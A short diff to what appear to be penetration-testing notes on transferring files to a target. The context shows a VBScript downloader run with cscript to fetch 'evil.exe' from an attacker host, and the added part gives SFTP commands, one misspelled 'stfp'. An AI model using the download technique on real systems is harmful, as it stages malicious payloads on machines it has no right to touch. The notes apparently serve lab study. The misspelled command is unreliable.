@@ -66,3 +66,8 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 
 $> cscript wget.vbs http://10.11.0.42/evil.exe evil.exe
+
+
+# 8) SFTP
+$> sftp remoteUser@10.11.1.252:/home/remoteUser/file file
+$> stfp file remoteUser@10.11.1.252:/home/remoteUser/file 
